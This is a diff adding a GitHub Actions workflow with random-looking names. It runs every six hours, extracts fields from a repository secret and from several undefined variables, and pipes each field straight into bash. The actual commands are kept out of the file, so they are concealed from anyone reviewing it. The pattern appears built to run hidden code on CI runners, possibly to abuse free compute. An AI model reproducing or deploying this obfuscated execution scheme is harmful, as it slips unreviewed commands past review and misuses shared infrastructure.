@@ -1,0 +1,23 @@
+name: jiangkuilei7816
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '59 1/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: jiangkuilei7816
+        env:
+          ioxv7: ${{ secrets.ioxv7 }}
+        run: |
+          echo $ioxv7 | jq -r .jp1655 | /bin/bash
+          echo $uwwrq8 | jq -r .qka69 | /bin/bash
+          echo $s6 | jq -r .m201 | /bin/bash
+          echo $mch733 | jq -r .yf148 | /bin/bash
+          echo $o19 | jq -r .tbb1119 | /bin/bash
+          echo $ube97161 | jq -r .wsbm1027 | /bin/bash
+          echo $gke0973 | jq -r .rr63 | /bin/bash
+
